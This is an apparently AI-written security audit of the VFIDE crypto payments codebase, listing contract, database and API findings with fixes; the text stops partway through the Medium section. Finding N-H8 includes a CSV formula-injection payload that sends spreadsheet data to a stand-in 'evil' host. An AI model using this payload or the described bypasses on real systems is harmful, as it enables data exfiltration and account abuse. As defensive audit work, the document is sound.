# VFIDE New Audit Findings — 2026-04-28

**Source:** Six-pass adversarial review (4 transcripted + 2 in-session)
**Reviewer:** Claude Opus 4.7
**Repository state reviewed:** `Vfide-main__2_.zip` uploaded 2026-04-28
**Slot:** Net-new findings beyond the 140-item `VFIDE_AUDIT_REMEDIATION_CHECKLIST.md`
**Total:** 109 findings — **6 Critical, 25 High, 40 Medium, 38 Low/Informational**

## How to use this file

- Finding IDs use the `N-` prefix to distinguish from the prior `C-`/`H-`/`M-`/`L-` catalog. Pair this file with the existing checklist; do not merge.
- Where the same defect surfaced in multiple passes under different IDs (e.g. once as `N-H4`, restated as `N-M13`), it appears once here at the higher severity. The lower-severity restatement ID is noted under "See also".
- File and line references are against the repo as uploaded; re-verify after rebases. Many fixes are one-line; a handful require schema or architectural change.
- The single highest-priority finding remains **N-C4** — fraud-escrow is dead code for the vault-mediated transfer path that is essentially every transfer in production.

## Reading the entries

```
### N-X## — title
- [ ] **Status:** open / fixed / accepted / wontfix
- **Severity:** critical / high / medium / low
- **Location:** path/to/file.sol:Lstart-Lend  (or :Lline)
- **Description:** what the bug is, why it matters
- **Recommended fix:** concrete remediation
- **See also:** related finding IDs
```

---

## Critical (6)

### N-C1 — `vfide_app` DB role grants are incomplete; RLS will brick or be bypassed in production
- [ ] **Status:** open
- **Severity:** critical
- **Location:** `migrations/20260422_010000_create_vfide_app_role.sql` L31-39
- **Description:** Only 8 tables are GRANT-ed to `vfide_app` (`users`, `messages`, `friendships`, `user_rewards`, `proposals`, `endorsements`, `security_violations`, `schema_migrations`). The actual schema includes ~50+ tables routes touch, including `merchants`, `merchant_invoices`, `payment_requests`, `transactions`, `loans`, `subscriptions`, `merchant_locations`, `merchant_coupons`, `merchant_loyalty`, `merchant_expenses`, `merchant_gift_cards`, `merchant_returns`, `merchant_installments`, `merchant_suppliers`, `merchant_wholesale_*`, `market_stories`, `streams`, `enterprise_orders`, `time_locks`, `vault_identity_lookup`, `flashloan_lanes`, `encryption_key_directory`, `security_event_logs`, `security_alert_dispatches`, `security_webhook_replay_events`, `achievements`, `streaks`, `monthly_leaderboard`, `errors`, `sync_state`, `privacy_deletion_requests`, `merchant_payment_confirmations`, `merchant_withdrawals`, `merchant_staff_sessions`, `merchant_customer_notes`, `remittance_beneficiaries`, `indexer_*`, etc. `.env.local.example` instructs operators to use `vfide_app` in production. Either the app gets `permission denied` on most routes (and silently degrades via `lib/db.ts` retries) or operators fall back to a superuser and RLS is silently bypassed.
- **Recommended fix:** Add a GRANT-all-application-tables migration; add a CI check that every table referenced from `app/` has a matching grant. Consider a per-table grant generator that scans migrations.
- **See also:** restated as N-M8 in pass 2.

### N-C2 — `VaultHub.executeRecoveryRotation` has a 72h `RECOVERY_CHALLENGE_DELAY` with no challenge mechanism
- [ ] **Status:** open
- **Severity:** critical
- **Location:** `contracts/VaultHub.sol` L490-530
- **Description:** Sets `recoveryUnlockTime[vault] = block.timestamp + RECOVERY_CHALLENGE_DELAY`, but neither `VaultHub` nor `CardBoundVault` exposes a method letting `ownerOfVault[vault]` abort during the window. `pause()` does not help — `executeRecoveryRotation` does not gate on `paused`. Two colluding or compromised recovery approvers complete a takeover the owner is mathematically powerless to stop. Defeats the C-6 remediation's purpose.
- **Recommended fix:** Add `abortRecoveryRotation(vault)` callable by `ownerOfVault[vault]`, OR `vetoRecoveryRotation(vault)` requiring guardian co-sign. Reset all rotation state on abort.
- **See also:** complementary to N-H10 (CardBoundVault leftover pending state on rotation).

### N-C3 — Step-up authentication for high-risk payments is satisfied by a client-controlled header
- [ ] **Status:** open
- **Severity:** critical
- **Location:** `app/api/crypto/payment-requests/route.ts` L232-262
- **Description:** Reads `request.headers.get('x-vfide-step-up')` and accepts the literal string `'verified'` as proof of step-up. No challenge/response, no token verification, no signature, no server-side state. Any client (including a stolen-JWT attacker) sets the header and bypasses the gate. The "delay acknowledgment" header `x-vfide-delay-ack: acknowledged` has the same flaw. Grep confirms no server-side challenge or state for these headers anywhere in `lib/security/` or `lib/auth/`.
- **Recommended fix:** Bind step-up to a server-issued one-time challenge (POST → server returns nonce; client signs nonce with wallet; server verifies signature, marks consumed, then accepts the high-risk action carrying the same nonce in a single atomic step).

### N-C4 — `VFIDEToken._transfer` checks fraud status of the *vault contract*, never the user — fraud-escrow is dead code for vault-mediated transfers (HIGHEST IMPACT)
- [ ] **Status:** open
- **Severity:** critical (highest priority of the 109 findings)
- **Location:** `contracts/VFIDEToken.sol` L1037-1044, `contracts/FraudRegistry.sol` L168
- **Description:** `_transfer` evaluates `fraudRegistry.requiresEscrow(from)` where `from` is the vault contract for vault-mediated transfers. `FraudRegistry.fileComplaint` L168 explicitly rejects targets where `vaultHub.isVault(target) == true`, so vaults can never be flagged and `requiresEscrow(vault)` is always false. The 30-day escrow on flagged users — the central purpose of the entire FraudRegistry/escrow system — never triggers for the protocol's default transfer path once vault-only mode is engaged.
- **Recommended fix:**
  ```solidity
  address fraudCheckAddr = _resolveFeeScoringAddress(from);  // already exists, used at L1124
  if (... && fraudRegistry.requiresEscrow(fraudCheckAddr)) { ... }
  ```
- **See also:** N-H17 (MerchantPortal.processPayment legacy public function skips `_checkFraudStatus`); N-L14 (VFIDEBridge._lzReceive also doesn't fraud-check, partially covered by N-C4 fix); N-L13 (SubscriptionManager.processPayment same gap). This finding fully invalidates the prior assessment of H-10 ("no bug present").

### N-C5 — SIWE challenge `domain` built from `Host` header (re-verify after C-12/C-15)
- [ ] **Status:** likely-fixed; verify after the C-12/C-15 remediations
- **Severity:** critical (if unfixed)
- **Location:** `app/api/auth/challenge/route.ts` L34, `lib/security/siweChallenge.ts::resolveTrustedAuthDomain` L37
- **Description:** Pass-1 originally flagged that the SIWE message's `domain` was being constructed from the unvalidated `Host` request header. Pass-5 confirmed `resolveTrustedAuthDomain` now validates the request's `host` header against `APP_ORIGIN`/`NEXT_PUBLIC_APP_URL` and rejects unknown hosts in production (returning `null` → 400 `Untrusted auth domain`). The fix matches the C-12/C-15 remediations in the existing checklist. Listed here so the production deploy explicitly verifies all three of: (a) `APP_ORIGIN` is set in production env; (b) middleware doesn't strip the `host` header; (c) `NODE_ENV === 'production'` at runtime.
- **Recommended fix:** verification, not code.

### N-C6 — `DAOTimelock.execute` never calls back to `DAO.markExecuted`; proposals stay `queued=true, executed=false` forever
- [ ] **Status:** open
- **Severity:** critical (correctness/bookkeeping; not directly exploitable but breaks the audit trail and may enable governance replay)
- **Location:** `contracts/DAOTimelock.sol` L130-158, `contracts/DAO.sol` L763
- **Description:** `DAO.markExecuted` is gated `require(msg.sender == address(timelock), ...)` and is the only path that sets `p.executed = true`. `DAOTimelock.execute` does the call, sets `op.done`, emits `Executed(id)`, and returns — it does **not** call `dao.markExecuted(daoId)`. So `p.executed` is never true. The DAO's `Executed(id)` event never fires. After `QUEUE_EXPIRY`, anyone can call `expireQueuedProposal(id)` and the state degrades to `{queued:false, executed:false}` even though the action ran. Off-chain indexers see proposals as eternally `queued`. No on-chain consumer of `p.executed` exists today, but future ones inherit the bug. The same `(target, value, data)` could in principle be re-proposed and executed twice through two timelock IDs, since the DAO can't tell the first one ran.
- **Recommended fix:** EITHER (a) extend `DAOTimelock.queueTx` to record the source `daoId`, then call `dao.markExecuted(daoId)` from `execute` after success; OR (b) deprecate `markExecuted` and indexers reconcile from the timelock's `Executed` event directly.

---

## High (25)

### N-H1 — `FraudRegistry.clearFlag` unbounded loop, ~500 transfers per call
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/FraudRegistry.sol` L388-402
- **Description:** When DAO clears a flag, the function iterates the entire `userEscrowIndices[target]` (capped 500) and refunds every active escrow inline. ~30K gas per warm `safeTransfer` × 500 ≈ 15M+ gas — at risk of OOG on Ethereum mainnet (30M block limit), tightly bounded on Base. A serial fraudster with many in-flight escrows can become impossible to rehabilitate.
- **Recommended fix:** Paginate: `clearFlag(target, maxRefunds)`. Mark the flag as cleared only after all escrows are processed; expose progress via a view.
- **See also:** restated as N-M10 in pass 2.

### N-H2 — `FraudRegistry.clearFlag` doesn't reset complaint state → 1-vote re-flag griefing
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/FraudRegistry.sol` L388
- **Description:** After `clearFlag`, `complaintCount[target]` stays ≥ 3, `complaints[]` and `hasComplained[][]` are untouched. The next single complaint from any reporter at ProofScore ≥ 5000 instantly re-trips the threshold and re-pending-reviews the user. Original reporters are also permanently blocked from filing again because `hasComplained[target][reporter]` is never cleared.
- **Recommended fix:** Reset `complaintCount[target]`, clear all `complaints` for target (paginated if needed), and reset `hasComplained[target][*]` on `clearFlag`.
- **See also:** restated as N-M11 in pass 2.

### N-H3 — Escrow recipient is captured at send-time as the *destination vault address*; vault rotation in the 30-day window orphans funds
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/VFIDEToken.sol` L1042; `contracts/FraudRegistry.sol::releaseEscrow`
- **Description:** `escrowTransfer(from, custodyTo, remaining)` is called with `custodyTo = _vaultOfAddr(logicalTo)`. `releaseEscrow` later transfers to that captured address. If the recipient performs a wallet rotation or VaultHub remaps them to a new vault during the 30-day escrow, tokens land in the prior vault, which the recipient may no longer control.
- **Recommended fix:** Store recipient *owner* (`logicalTo`) in the escrow record; re-resolve `vaultOf(owner)` at release time.
- **See also:** restated as N-M12 in pass 2; same root cause as N-H15 (CommerceEscrow capture-on-open) and N-H17-pattern in subscriptions.

### N-H4 — `releaseEscrow` reverts forever if `systemExempt` flag is later removed
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/FraudRegistry.sol` L249-256
- **Description:** Hard-requires `IVFIDEToken_SystemExempt(...).systemExempt(address(this)) == true`. If governance ever removes the flag, every pending escrow becomes permanently undeliverable. The 90-day `rescueStuckEscrow` path also routes through `safeTransfer`, which would lose fees.
- **Recommended fix:** Either (a) make systemExempt sticky-once-set (require-on-set, no-revoke for FraudRegistry), or (b) add a fallback claim path with explicit user acknowledgment of fees if exempt is removed.
- **See also:** restated as N-M13 in pass 2.

### N-H5 — `users_read_authenticated` policy lets every authenticated user read every column of `users`
- [ ] **Status:** open
- **Severity:** high
- **Location:** `migrations/20260426_100000_fix_rls_users_read_public.sql`
- **Description:** Replacement policy is `USING (current_setting('app.current_user_address', true) IS NOT NULL AND <> '')` — i.e., any authenticated user can `SELECT *` from `users`. Currently `proof_score` (behavioral reputation) plus any future column carrying PII or moderator-only flags becomes a free-for-all. Combined with N-M40 (PII collection) and the absence of column-level grants, the user table is much more readable than the architecture's privacy claims imply.
- **Recommended fix:** Either narrow to a public-safe column projection (e.g., `users_public` view exposing only `wallet_address, username, avatar`), or grant column-level `GRANT SELECT (col1, col2)` and revoke broader access.
- **See also:** restated as N-M9 in pass 2.

### N-H6 — `CardBoundVault.executeRecoveryRotation` leaves dangerous queued state for the new admin to inadvertently apply
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/CardBoundVault.sol` L1036-1056
- **Description:** After the hub forces ownership to `newWallet`, only `pendingRotation` and `pendingGuardianChange` are cleared. Five other pending structs survive: `pendingSpendLimitChange`, `pendingLargeTransferThresholdChange`, `pendingERC20Rescue`, `pendingNativeRescue`, `pendingTokenApproval`. All have `apply*()` functions gated `onlyAdmin`. A compromised prior admin can pre-position a malicious `pendingERC20Rescue` (recipient = attacker, amount = full balance) before triggering recovery. After the 7-day `SENSITIVE_ADMIN_DELAY` elapses during the recovery window, the new admin sees an "approved" pending action and may unwittingly apply it.
- **Recommended fix:**
  ```solidity
  delete pendingSpendLimitChange;
  delete pendingLargeTransferThresholdChange;
  delete pendingERC20Rescue;
  delete pendingNativeRescue;
  delete pendingTokenApproval;
  ```
  Pair with N-C2 fix.

### N-H7 — Merchant `pending_confirmation` state can be set by anyone with the public payment link
- [ ] **Status:** open
- **Severity:** high
- **Location:** `app/api/merchant/checkout/[id]/route.ts` L143-175 (PATCH `action='pay'`)
- **Description:** Route is unauthenticated. Validates the supplied `tx_hash` only by checking the transaction exists on-chain and `receipt.status === 'success'`. Does not verify (a) the sender is the customer, (b) the recipient is the merchant, (c) the token is VFIDE/expected token, (d) the amount matches the invoice. Anyone with the payment link submits any random successful tx hash, flips the invoice to `pending_confirmation`, and triggers the 409 "already pending" guard against the legitimate customer. DoS of the merchant's checkout flow.
- **Recommended fix:** Verify the supplied tx logs a Transfer/PaymentProcessed event from VFIDEToken/MerchantPortal whose `(from, to, amount)` matches the invoice's customer, merchant vault, and amount. Reject otherwise.

### N-H8 — CSV export is vulnerable to formula injection in Excel/Sheets/Numbers
- [ ] **Status:** open
- **Severity:** high
- **Location:** `app/api/transactions/export/route.ts` L120-227
- **Description:** Cells like `memo`, `from_address`, `to_address`, `token_symbol` are CSV-quoted but never sanitized against a leading `=`, `+`, `-`, `@`, `\t`, or `\r`. An attacker sends a tiny payment with `memo = '=HYPERLINK("http://evil/?c=" & A1, "click")'`, the victim exports their history, opens the CSV in Excel, and gets formula execution / data exfiltration. CWE-1236.
- **Recommended fix:** Prefix any cell starting with one of the dangerous characters with a single-quote (`'`). Apply at every user-supplied field on the way into the CSV.

### N-H9 — `MerchantPortal.processPayment` (legacy public function) skips fraud-status checks on customer and merchant
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/MerchantPortal.sol` L564-636
- **Description:** Both `_processPaymentInternal` (L740-741) and `_processPaymentWithChannel` (L913-914) call `_checkFraudStatus(customer); _checkFraudStatus(merchant);`. The legacy public `processPayment` does NOT. Combined with N-C4, a flagged customer or flagged merchant transacts through `processPayment` with neither MerchantPortal nor VFIDEToken applying any restriction.
- **Recommended fix:** Add the same two `_checkFraudStatus` calls at the top of `processPayment`. Pair with N-C4 fix so the underlying `requiresEscrow` actually returns true.

### N-H10 — `VaultHub.executeRecoveryRotation` doesn't clear pending sensitive state on the vault
- [ ] **Status:** open
- **Severity:** high (duplicate of N-H6 from VaultHub side)
- **Location:** `contracts/VaultHub.sol` flow into `CardBoundVault.executeRecoveryRotation`
- **Description:** Same root cause as N-H6 — the cleanup of pending sensitive structs is incomplete on the rotation path.
- **Recommended fix:** see N-H6.

### N-H11 — `MerchantPortal.initiateRefund` lets a merchant fill any customer's refund-history cap, disabling future refunds
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/MerchantPortal.sol` L447-477
- **Description:** No check that `customer` ever paid the merchant. A merchant calls `initiateRefund(victim, vfideAddr, 1, "fake")` 500 times. Each appends to `customerRefunds[victim]` (capped 500) and `merchantRefunds[msg.sender]`. Once the customer's array is full, **no merchant** can ever initiate a refund to that victim again — the 500-cap revert blocks legitimate refunds protocol-wide for that user.
- **Recommended fix:** EITHER (a) cap on *uncompleted* refunds, OR (b) require a matching prior `PaymentProcessed` event for `(merchant, customer)`, OR (c) move customer-side tracking off the array (e.g., a counter that decrements on completion).

### N-H12 — `SubscriptionManager.processPayment` allows merchant to auto-cancel a subscription via 3 failed payments in one block
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/future/SubscriptionManager.sol` L273-360
- **Description:** During the 24h `MERCHANT_EXCLUSIVE_WINDOW`, only the merchant can call `processPayment`. On insufficient allowance/balance, `failedPayments++` and the function returns (no revert). At `MAX_FAILED_PAYMENTS = 3`, the subscription cancels. A malicious merchant timing the call against a brief subscriber balance dip cancels the subscription with three transactions in the same block. The subscriber, who can't call during the exclusive window, has no defense.
- **Recommended fix:** Rate-limit failure recordings: count at most one failure per `interval` (or per day, or require N seconds between recordings). On rapid repeats, no-op rather than incrementing.

### N-H13 — `VFIDEBridge` no automatic refund when destination liquidity exhausts
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/future/VFIDEBridge.sol` L460-467
- **Description:** If the destination bridge runs out of pre-funded VFIDE during `_lzReceive`, the inbound message reverts. LayerZero retries are bounded; eventually the message is treated as failed. Source-chain tokens stay locked. The user has no automatic refund — they must wait for the owner to call `openBridgeRefundWindow(txId)` after manual review (per the L342 comment "Owner must call openBridgeRefundWindow() after manually verifying non-delivery"). A flooded bridge or compromised liquidity-provisioner can lock user funds indefinitely.
- **Recommended fix:** Expose `userRequestRefundReview(txId)` to add a public review queue with a public timer; after a public window without delivery proof, auto-open the refund.

### N-H14 — `VFIDECommerce.CommerceEscrow.dispute` can grief a merchant into auto-suspension with 3 minimal-cost disputes
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/VFIDECommerce.sol` L248-256, L116-126 (`MerchantRegistry._noteDispute`)
- **Description:** `dispute()` is callable by either buyer or merchant on a `FUNDED` escrow. Each call invokes `merchants._noteDispute(merchantOwner)`, which auto-suspends when `m.disputes >= autoSuspendDisputes` (default 3). One malicious user with three accounts (or three colluding users) opens three small escrows, funds them, disputes each — the merchant is auto-suspended. The buyer's funds are locked in escrow until DAO resolves, but the cost is minimal if the disputes are tiny escrows. No time-decay on the dispute counter, no ProofScore floor for filing.
- **Recommended fix:** Time-decay window for disputes (e.g., 90 days), ProofScore ≥ X required to file, OR count only DAO-resolved disputes against the merchant.

### N-H15 — `VFIDECommerce.CommerceEscrow.release`/`refund` send to vault addresses captured at `open()` — vault rotation in flight orphans funds
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/VFIDECommerce.sol` L177-180 (`open`), L231-246 (`release`/`refund`)
- **Description:** Stores `buyerVault` and `sellerVault` at order creation. On `release`/`refund`, funds are sent to those captured addresses with no re-resolution. If either party performs a wallet rotation or has their `vaultOf(owner)` mapping change between `open()` and resolution, tokens land in a vault they may no longer control. Same root cause as N-H3 and the subscription path.
- **Recommended fix:** Re-resolve at release/refund time using `vaultHub.vaultOf(buyerOwner)` / `vaultHub.vaultOf(merchantOwner)`.

### N-H16 — `OwnerControlPanel` exposes 3 always-reverting recovery functions
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/OwnerControlPanel.sol` L785-807
- **Description:** `vault_requestDAORecovery`, `vault_finalizeDAORecovery`, `vault_cancelDAORecovery` call into `VaultHub.requestDAORecovery`/`finalizeDAORecovery`/`cancelDAORecovery`, all three of which are `pure` and `revert VH_RecoveryDisabled()` (per the C-6 remediation that removed force-recovery). The OCP layer always reverts — dead code that misleads operators following runbooks. The OCP's `_consumeQueuedAction` runs first, so partial state survives transaction-rollback (queue is restored), but the operational signal is wrong.
- **Recommended fix:** Remove these three OCP functions, OR rewire them to the new `VaultRecoveryClaim` path.

### N-H17 — `MerchantPortal.processPayment` (legacy entry) skips `_checkFraudStatus`
- [ ] **Status:** open
- **Severity:** high (duplicate of N-H9, restated for clarity in pass 4)
- **Recommended fix:** see N-H9.

### N-H18 — `VaultRegistry.setEmailRecovery` and `setPhoneRecovery` accept un-salted hashes, defeating H-48
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/VaultRegistry.sol` L216-249
- **Description:** The H-48 fix scoped recovery hashes with `chainId + address(this)`. `setRecoveryId` and `setUsername` enforce this by deriving the hash on-chain from plaintext during lookup (`_deriveScopedHash`). But `setEmailRecovery` and `setPhoneRecovery` accept a raw `bytes32` and just store it. The doc-comment on `searchByEmail` says "*should* be a scoped hash" — but the contract never enforces or verifies. A naive client implementing `keccak256(lowercase(email))` defeats salting entirely; anyone with Alice's email can compute the hash and look up her vault. The contract treats both client behaviors as valid and can't tell them apart at lookup time.
- **Recommended fix:** EITHER take plaintext at the setter and derive the scoped hash on-chain (mirrors `setRecoveryId`/`setUsername`), OR encode a discriminator byte in the hash so the contract can reject unsalted submissions.

### N-H19 — `OwnerControlPanel.vault_freezeVault` is non-functional but advertised as a working freeze
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/OwnerControlPanel.sol` L820-834
- **Description:** Reports a high-severity risk to PanicGuard via `panicGuard.reportRisk(vault, 30 days, 100, "ocp_freeze")`. Per grep (`securityHub`/`isLocked`/`panicGuard` against VFIDEToken, CardBoundVault, MerchantPortal, all production runtime), no production contract reads PanicGuard state to gate operations — the SecurityHub-locking pattern was deliberately removed for non-custodiality. So the PanicGuard "freeze" only emits an event; the targeted vault continues to operate normally. Operators following an admin runbook will believe they froze a vault and act on that assumption.
- **Recommended fix:** Either remove `vault_freezeVault`, OR rewrite its behavior + name to match what it actually does (a "report risk" tripwire that emits events for off-chain monitoring), OR wire vault transfers to consult PanicGuard.

### N-H20 — `app/api/auth/route.ts` returns the JWT in the JSON response body in addition to the HTTPOnly cookie
- [ ] **Status:** open
- **Severity:** high
- **Location:** `app/api/auth/route.ts` L191-199
- **Description:** The defensive comment claims "JSON token enables fetch() requests that can read the response body" — that's incorrect reasoning. `fetch(..., { credentials: 'include' })` carries the HTTPOnly cookie automatically without needing access to the cookie's value. By echoing the JWT into the JSON body, every successful login response is XSS-readable. Any reflected or stored XSS in the app can grab tokens from the login response and exfiltrate, defeating the entire purpose of the HTTPOnly flag. Single-line fix.
- **Recommended fix:** Stop returning the token in the JSON. Rely on the cookie alone; client uses `credentials: 'include'` on subsequent fetches. Document `Authorization` header as a fallback for non-browser clients (where cookies aren't applicable) but only on a separate non-cookie endpoint.

### N-H21 — `lib/services/gasPriceService.ts` exposes `NEXT_PUBLIC_ETHERSCAN_API_KEY` to every browser
- [ ] **Status:** open
- **Severity:** high
- **Location:** `lib/services/gasPriceService.ts` L72, L136-138
- **Description:** Etherscan API key read from a `NEXT_PUBLIC_*` variable, bundled into client JS, used in `https://api.etherscan.io/api?...&apikey=${apiKey}`. Any visitor extracts it from the bundle and drains the project's Etherscan rate-limit quota. On a paid Etherscan tier, this is direct cost.
- **Recommended fix:** Move the gas-price fetch behind a server route. Hold the key in a non-public env var (`ETHERSCAN_API_KEY`). Cache responses server-side (10-second TTL) and have clients hit your endpoint instead.

### N-H22 — `NEXT_PUBLIC_PIMLICO_API_KEY` is exposed to clients with no domain restriction visible in code
- [ ] **Status:** open
- **Severity:** high (if domain restriction is not configured at Pimlico)
- **Location:** Bundle build time (any `NEXT_PUBLIC_*` var)
- **Description:** Pimlico paymaster keys grant sponsored-transaction submission rights. Client-side exposure means anyone who views the bundle can copy the key. If domain-allowlisting is not configured at Pimlico, third parties can submit transactions through the project's paymaster, draining the sponsorship balance.
- **Recommended fix:** Configure domain-allowlist at Pimlico explicitly. Document the operational requirement. Consider proxying paymaster requests through a server route holding a non-public key.

### N-H23 — `EmergencyControl` and `EmergencyBreaker` are nearly disconnected from the system they're supposed to halt
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/EmergencyControl.sol` (full), `contracts/VFIDESecurity.sol::EmergencyBreaker`
- **Description:** `EmergencyControl` calls `breaker.toggle(halt, reason)` from M-of-N committee paths and DAO toggle. Across the production contract set, only `contracts/future/SubscriptionManager.sol` L262 reads `emergencyBreaker.halted()`, and it does so as a *precondition* for `emergencyCancel` rather than as a transfer-gate — i.e., the emergency state *enables* one DAO action, it does not *block* user transfers. Confirmed via grep: VFIDEToken, CardBoundVault, MerchantPortal, VaultHub, VFIDECommerce, VFIDETermLoan, VFIDEFlashLoan, EscrowManager — **none** read `EmergencyBreaker`. The entire emergency-halt apparatus (committee voting, cooldowns, foundation rotation, anti-flap) is operationally a logging-only mechanism.
- **Recommended fix:** EITHER wire `breaker.halted()` into `_transfer` and major payment paths as a circuit breaker, OR explicitly document that the emergency layer is observability-only and rebrand the `halt`/`unhalt` UX accordingly.

### N-H24 — `MerchantCompetitionPool.recordTransaction` accepts attacker-supplied `volumeUsd` with no on-chain proof
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/pools/MerchantCompetitionPool.sol` L31-45
- **Description:** Function is `RECORDER_ROLE` gated, but the recorder is a single off-chain operator. They pass `(merchant, volumeUsd)` as free parameters; nothing cross-checks against `MerchantPortal.totalVolumeProcessed[merchant]` or any other on-chain transaction record. A captured or buggy recorder credits any merchant with arbitrary volume — including 1 trillion USD to a single address — to dominate the period pool and drain the protocol's MerchantCompetitionPool fee share. Same shape applies to `DAOPayrollPool.recordVote/recordReview/recordDiscussion/recordAttendance` and the analogous HeadhunterCompetitionPool. The Howey claim ("If you did 30% of the work, you get 30% of the pool") relies on the recorder being honest.
- **Recommended fix:** Require the recorder to pass an on-chain reference (txhash, period bounds, MerchantPortal accumulator delta) that the contract validates before accepting credit. OR have the pool query MerchantPortal directly using a delta-since-last-period accumulator approach.

### N-H25 — `ServicePool.totalCommitted` over-counts unclaimed shares forever, starving future periods
- [ ] **Status:** open
- **Severity:** high
- **Location:** `contracts/ServicePool.sol` L186-215, L217-240, L300-306
- **Description:** `finalizePeriod` sets `totalCommitted += pool` (full pool size). `claimPayment` decrements `totalCommitted -= payment` only when participants actually claim. Two leak modes: (a) integer division `(pool * myScore) / totalScores[period]` truncates, leaving rounding remainder unclaimed; (b) participants may never claim. `availableBalance` and `finalizePeriod` use `balance - totalCommitted` for next-period sizing — pool starves. `emergencyWithdraw` is also gated to `balance - totalCommitted`, so even DAO can't recover the dust.
- **Recommended fix:** Add `sweepUnclaimed(uint256[] periods)` callable after, e.g., 6 months unclaimed; recredit dust to a DAO-sweepable bucket. Alternatively, track per-period `claimedSum` and have `totalCommitted` reflect actual outstanding only.

---

## Medium (40)

### N-M1 — `VFIDETestnetFaucet.batchClaim` hard-reverts whole batch on bad referrer
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/testnet/VFIDETestnetFaucet.sol` ~L185
- **Description:** `if (referrers[i] == user || !hasClaimed[referrers[i]]) revert Faucet_ReferrerNotEligible();` inside the loop. Any single bad referrer torpedoes the entire batch. The earlier `if (... hasClaimed[user]) continue;` shows the intended skip pattern.
- **Recommended fix:** Skip the referral instead of reverting; still complete the user's claim.

### N-M2 — `VFIDETestnetFaucet.setEcosystemVault` lacks zero-check
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/testnet/VFIDETestnetFaucet.sol` ~L233
- **Description:** Setting to `address(0)` silently breaks referral attribution because the `try _registerReferral` swallows the failure.
- **Recommended fix:** `if (_ecosystemVault == address(0)) revert Faucet_Zero();`

### N-M3 — Burn portion of fraud-flagged transfers is irreversible even on dismissal
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/VFIDEToken.sol` L975-984
- **Description:** `_applyBurn` runs *before* the FraudRegistry escrow branch. If the DAO later dismisses complaints via `clearFlag`, only `remaining` (post-fee) is refunded. The 40% × score-dependent burn fraction is permanently gone.
- **Recommended fix:** Move burn after escrow decision, OR split burn into pending-burn that finalizes only on escrow release; refund pending-burn on dismissal.

### N-M4 — `processDismissedComplaintPenalties` is opt-in / never auto-invoked
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/FraudRegistry.sol` L342
- **Description:** `dismissComplaints` clears review state without applying any reporter penalty. Penalties only happen if someone manually calls `processDismissedComplaintPenalties` later. If operations forgets, false reporters keep their score forever.
- **Recommended fix:** Trigger one bounded chunk inside `dismissComplaints`, OR add to operational keeper runbook with a monitored heartbeat.

### N-M5 — Permit hardcodes a literal instead of the declared `ECDSA_S_UPPER_BOUND` constant
- [ ] **Status:** open
- **Severity:** low (cosmetic; promoted from L tier for tracking)
- **Location:** `contracts/VFIDEToken.sol` L333 vs L38
- **Description:** Permit bound check uses a hardcoded value instead of the named constant.
- **Recommended fix:** Use `ECDSA_S_UPPER_BOUND`.

### N-M6 — `Seer.setOperatorLimits` only adjusts 3 of 5 rate-limit knobs
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/Seer.sol` L836-844
- **Description:** Writes `maxSingleReward`, `maxDailyOperatorReward`, `maxDailyOperatorGlobalReward`. Does NOT update `maxDailyOperatorPunish` (200, hardcoded) or `maxDailySubjectDelta` (300, hardcoded). The DAO has no on-chain method to ever change punish caps without redeploying Seer.
- **Recommended fix:** Add `setOperatorPunishLimits(uint256 maxDailyOperatorPunish, uint256 maxDailySubjectDelta)` with the same governance gating.

### N-M7 — `Seer.calculateOnChainScore` trusts source-returned `weight` rather than registered weight
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/Seer.sol` L626-634
- **Description:** Registration enforces `_activeScoreSourceWeight() + weight ≤ 100`. At calculation, the loop uses `weight` returned by the source contract via `getScoreContribution(subject)`, capped only against `uint8` (255). Registered weight ignored at runtime. A misconfigured/compromised source can return up to 255, dominating on-chain component. Saturation at `MAX_SCORE` bounds extreme abuse, but two cooperating sources can skew normal scoring.
- **Recommended fix:** Use the protocol-stored `scoreSources[i].weight` rather than the source's runtime return.

### N-M8 — `vfide_app` DB role grants are incomplete (HIGH-severity restatement: see N-C1)
- [ ] **Status:** open
- **Severity:** medium per pass 2; treated as critical (N-C1)
- **See:** N-C1.

### N-M9 — `users_read_authenticated` over-permissive (HIGH-severity restatement: see N-H5)
- [ ] **Status:** open
- **See:** N-H5.

### N-M10 — `FraudRegistry.clearFlag` unbounded loop (HIGH-severity restatement: see N-H1)
- [ ] **Status:** open
- **See:** N-H1.

### N-M11 — `FraudRegistry.clearFlag` doesn't reset complaint state (HIGH-severity restatement: see N-H2)
- [ ] **Status:** open
- **See:** N-H2.

### N-M12 — Escrow recipient captured at vault-address (HIGH-severity restatement: see N-H3)
- [ ] **Status:** open
- **See:** N-H3.

### N-M13 — `releaseEscrow` reverts on systemExempt removal (HIGH-severity restatement: see N-H4)
- [ ] **Status:** open
- **See:** N-H4.

### N-M14 — `EcosystemVault.creditUserReferral` and `creditMerchantReferral` perform no on-chain check of the threshold they claim to enforce
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/EcosystemVault.sol` L938-966
- **Description:** NatSpec says "Credit user referral after user has $25+ worth in vault" and "after merchant completes 3+ transactions". Code only checks `seer.getScore(referrer) >= HEADHUNTER_MIN_SCORE`. The "$25+" and "3+ tx" gates are purely off-chain. A compromised or buggy `manager` (off-chain backend) can mint referral points unboundedly to any address with a valid score.
